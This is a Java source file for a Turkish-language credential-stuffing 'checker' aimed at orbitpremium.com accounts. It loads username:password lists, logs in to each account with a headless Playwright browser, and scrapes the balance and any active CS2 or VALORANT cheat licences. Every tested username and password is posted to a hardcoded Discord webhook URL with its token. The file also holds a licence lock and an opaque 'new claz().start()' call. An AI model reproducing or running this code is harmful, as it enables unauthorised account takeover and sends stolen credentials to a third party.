package com.wuplish.main;

import com.microsoft.playwright.*;
import com.wuplish.http.HttpDashboard;
import com.wuplish.loader.configloader;
import com.wuplish.utils.Output;
import com.wuplish.utils.UserAgentProvider;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.*;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.ExecutionException;

public class thisismainbro {
    public static String version = "1.0";
    static int threads = 1;
    static boolean headless = true;
    static Object nullpointer = new claz().start();
    public static String balanceValue;

    public static void init() {
        String versions = takeversion("https://raw.githubusercontent.com/Wuplish/Hotline-Auth/refs/heads/main/version");
        if (versions == nullpointer || !versions.trim().equals(version.trim())) {
            System.out.println("[!] Lütfen Son Sürüme Güncelleyiniz..");
            System.out.println("[!] 5 Saniye Sonra Uygulama Kapanacaktır..");
            try {
                Thread.sleep(5000);
                System.exit(1);
            } catch (InterruptedException e) {
                throw new RuntimeException(e);
            }
        }
    }

    public static void main() throws IOException {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            System.out.println("Konsol temizlenemedi.");
        }

        String workingDir = System.getProperty("user.dir");
        Path accountsPath = Paths.get(workingDir, "data/accounts.txt");
        List<String> hesaplar = Files.readAllLines(accountsPath);

        System.out.println(
                "\n\n" +
                        "                                  Welcome To Hotline OrbitPremium Checker\n" +
                        "                                            Made By wuplish\n\n" +
                        "------------------------------------------------------------------------------------------------------------\n");

        init();

        Scanner scanner = new Scanner(System.in);
        System.out.print("[?] Lisans kodunu giriniz: ");
        String girilenLisans = scanner.nextLine().trim();

        String cihazUUID = getWindowsUUIDWithPowerShell();
        if (cihazUUID == nullpointer || cihazUUID.isEmpty()) {
            System.out.println("[!] Cihaz UUID'si alınamadı.");
            System.exit(1);
        }
        System.out.println("[*] Cihaz UUID: " + cihazUUID);

        try {
            kontrolEt(girilenLisans, cihazUUID);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
        System.out.println("[*] Lisans ve UUID doğrulandı. Giriş başarılı!");
        try {
            new HttpDashboard();
        } catch (IOException e) {
            System.err.println("[!] Web panel başlatılamadı: " + e.getMessage());
        }

        configloader config = new configloader("data/config.json");
        threads = config.getInt("threads", 1);
        headless = config.getBoolean("headless", true);
        int slowMo = config.getInt("slowMo", 0);
        boolean devtools = config.getBoolean("devtools", false);
        boolean ignoreHTTPSErrors = config.getBoolean("ignoreHTTPSErrors", false);
        int viewportWidth = config.getInt("viewportWidth", 1920);
        int viewportHeight = config.getInt("viewportHeight", 1080);


        String webhook = "https://discord.com/api/webhooks/1387918262234382407/MqZvD5y73-hf9_PatPTtNRgKfR9dpy3ZxCHHw0c3rM_8X5542EMzRROodKYU_lKz8eWP";

        try (Playwright playwright = Playwright.create()) {
            BrowserType.LaunchOptions launchOptions = new BrowserType.LaunchOptions()
                    .setHeadless(headless)
                    .setSlowMo(slowMo)
                    .setDevtools(devtools)
                    .setArgs(List.of(
                        "--window-position=0,0",
                        "--window-size=" + viewportWidth + "," + viewportHeight
                    ));

            Browser browser = playwright.chromium().launch(launchOptions);
            for (String hesap : hesaplar) {
                String[] parts = hesap.split(":", 2);
                if (parts.length < 2) {
                    System.out.println("[!] Geçersiz hesap formatı: " + hesap);
                    continue;
                }
                String username = parts[0].trim();
                String password = parts[1].trim();

                Browser.NewContextOptions contextOptions = new Browser.NewContextOptions()
                        .setUserAgent(UserAgentProvider.getRandomUserAgent())
                        .setIgnoreHTTPSErrors(ignoreHTTPSErrors);

                BrowserContext context = browser.newContext(contextOptions);
                try {
                    Page page = context.newPage();

                    //System.out.println("[*] Deneniyor: " + username);
                    page.navigate("https://orbitpremium.com/auth/login?");
                    page.locator("xpath=/html/body/div[2]/div[2]/div[1]/div/div[2]/form/label[1]/input").fill(username);
                    page.locator("xpath=/html/body/div[2]/div[2]/div[1]/div/div[2]/form/label[2]/input").fill(password);
                    page.locator("xpath=/html/body/div[2]/div[2]/div[1]/div/div[2]/form/button").click();
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }
                    try {
                        page.waitForURL("**/account", new Page.WaitForURLOptions().setTimeout(700));
                    } catch (PlaywrightException e) {
                        try {
                            page.waitForURL("**/account/menu", new Page.WaitForURLOptions().setTimeout(700)); {}
                        } catch (PlaywrightException ex) {
                            //System.out.println("[!] Giriş başarısız: " + username);
                            HttpDashboard.updateStatus(username, "Giriş başarısız");
                            Output.writeInvalid(username, password);
                            //System.out.println("-----------------------------------------------------");
                            try {
                                sifreyanlissendEmbedWebhook(webhook, username, password);
                            } catch (InterruptedException ax) {
                                throw new RuntimeException(ax);
                            }
                            page.close();

                            continue;
                        }
                    }

                    //System.out.println("[*] Giriş başarılı: " + username);
                    Locator balanceElement = page.locator(".Sidebar_sidebar-profile__content-balance__M_KAZ");
                    try {
                        balanceValue = balanceElement.innerText();
                        System.out.println(balanceValue);
                    } catch (Exception e) {
                        //System.out.println("Hata oluştu: " + e.getMessage());
                    }
                    page.navigate("https://orbitpremium.com/account/download");

                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }

                    String[][] lisanslar = {
                            {"CS2 PRO", "/html/body/div[2]/div[2]/div[1]/div/div[2]/div/div[2]/div/div[1]/div[2]/div[2]/button"},
                            {"CS2", "/html/body/div[2]/div[2]/div[1]/div/div[2]/div/div[2]/div/div[2]/div[2]/div[2]/button"},
                            {"VALORANT", "/html/body/div[2]/div[2]/div[1]/div/div[2]/div/div[2]/div/div[3]/div[2]/div[2]/button"}
                    };

                    boolean enAzBirLisansVar = false;
                    StringBuilder aktifLisanslar = new StringBuilder();
                    StringBuilder lisanslarSatir = new StringBuilder();

                    for (String[] lisans : lisanslar) {
                        String isim = lisans[0];
                        String xpath = "xpath=" + lisans[1];

                        Locator buton = page.locator(xpath);

                        if (buton.count() > 0 && buton.first().isVisible()) {
                            String text = buton.first().textContent().trim();

                            if (text.equalsIgnoreCase("Programı İndir")) {
                                //System.out.println("[*] " + isim + " LİSANS VAR");
                                aktifLisanslar.append("• ").append(isim).append(" LİSANSI\n");
                                if (lisanslarSatir.length() > 0) lisanslarSatir.append(", ");
                                lisanslarSatir.append(isim);
                                enAzBirLisansVar = true;
                            }
                        }
                    }

                    if (enAzBirLisansVar) {
                        String mesaj = "🟢 Aktif Lisanslar:\n" + aktifLisanslar;
                        try {
                            HttpDashboard.updateStatus(username, "Giriş başarılı - Lisanslı (" + lisanslarSatir + ")");
                            Output.writeLicensed(username, password, lisanslarSatir.toString(), balanceValue );
                            trusendEmbedWebhook(webhook, username, password, mesaj);
                        } catch (InterruptedException e) {
                            throw new RuntimeException(e);
                        }
                    } else {
                        //System.out.println("[-] Hiçbir lisans aktif değil.");
                        try {
                            HttpDashboard.updateStatus(username, "Giriş başarılı - Lisans yok");
                            Output.writeNoLicense(username, password, balanceValue);
                            falsesendEmbedWebhook(webhook, username, password);
                        } catch (InterruptedException e) {
                            throw new RuntimeException(e);
                        }
                    }

                    page.close();
                    context.close();

                    //System.out.println("-----------------------------------------------------");
                } finally {
                    context.close();
                }
            } browser.close();
        }
    }


    public static void trusendEmbedWebhook(String webhookUrl, String username, String password, String mesaj) throws IOException, InterruptedException {
        String jsonPayload = """
            {
              "embeds": [{
                "title": "✅ Lisanslı Hesap Bulundu!",
                "description": "%s",
                "color": 3066993,
                "fields": [
                  {
                    "name": "Kullanıcı Adı",
                    "value": "%s",
                    "inline": true
                  },
                  {
                    "name": "Şifre",
                    "value": "%s",
                    "inline": true
                  }
                ]
              }]
            }
            """.formatted(escapeJson(mesaj), escapeJson(username), escapeJson(password));
        sendWebhook(webhookUrl, jsonPayload);
    }

    public static void falsesendEmbedWebhook(String webhookUrl, String username, String password) throws IOException, InterruptedException {
        String jsonPayload = """
            {
              "embeds": [{
                "title": "❌ Lisans Yok!",
                "color": 16711680,
                "fields": [
                  {
                    "name": "Kullanıcı Adı",
                    "value": "%s",
                    "inline": true
                  },
                  {
                    "name": "Şifre",
                    "value": "%s",
                    "inline": true
                  }
                ]
              }]
            }
            """.formatted(escapeJson(username), escapeJson(password));
        sendWebhook(webhookUrl, jsonPayload);
    }

    public static void sifreyanlissendEmbedWebhook(String webhookUrl, String username, String password) throws IOException, InterruptedException {
        String jsonPayload = """
            {
              "embeds": [{
                "title": "❌ Giriş Başarısız! Şifre Hatalı.",
                "color": 16711680,
                "fields": [
                  {
                    "name": "Kullanıcı Adı",
                    "value": "%s",
                    "inline": true
                  },
                  {
                    "name": "Şifre",
                    "value": "%s",
                    "inline": true
                  }
                ]
              }]
            }
            """.formatted(escapeJson(username), escapeJson(password));
        sendWebhook(webhookUrl, jsonPayload);
    }

    public static void sendWebhook(String webhookUrl, String jsonPayload) throws IOException, InterruptedException {
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder()
                .uri(URI.create(webhookUrl))
                .header("Content-Type", "application/json")
                .POST(HttpRequest.BodyPublishers.ofString(jsonPayload))
                .build();
        client.send(request, HttpResponse.BodyHandlers.ofString());
    }

    private static String escapeJson(String text) {
        return text.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r");
    }

    public static void kontrolEt(String girilenLisans, String girilenUUID) throws IOException, InterruptedException {
        List<String> licenseUuidLines = fetchLicenseFile("https://raw.githubusercontent.com/Wuplish/Hotline-Auth/refs/heads/main/auth");
        if (licenseUuidLines == nullpointer
                || licenseUuidLines.size() < 2) {
            System.out.println("[-] Lisans dosyası çekilemedi veya yetersiz veri.");
            System.exit(1);
        }

        List<String> licenseDataLines = licenseUuidLines.subList(1, licenseUuidLines.size());

        boolean lisansVar = false;
        boolean uuidEslesiyor = false;

        for (String line : licenseDataLines) {
            line = line.trim();
            String[] parts = line.split(":");
            if (parts.length == 2) {
                String license = parts[0].trim();
                String uuid = parts[1].trim();

                if (license.equalsIgnoreCase(girilenLisans)) {
                    lisansVar = true;
                    if (uuid.equalsIgnoreCase(girilenUUID)) {
                        uuidEslesiyor = true;
                    }
                    break;
                }
            }
        }

        if (!lisansVar) {
            System.out.println("[-] Lisans yanlış!");
            System.exit(1);
        } else if (!uuidEslesiyor) {
            System.out.println("[-] Lisans doğru ama UUID uyuşmuyor!");
            System.exit(1);
        }
    }

    public static List<String> fetchLicenseFile(String url) {
        try {
            HttpClient client = HttpClient.newHttpClient();
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200) {
                return List.of(response.body().split("\\r?\\n"));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String takeversion(String url) {
        try {
            HttpClient client = HttpClient.newHttpClient();
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(url))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200) {
                return response.body();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getWindowsUUIDWithPowerShell() {
        try {
            Process process = Runtime.getRuntime().exec(new String[]{
                    "powershell.exe", "-Command",
                    "Get-CimInstance Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"
            });
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String uuid = reader.readLine();
            reader.close();
            if (uuid != nullpointer) return uuid.trim();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
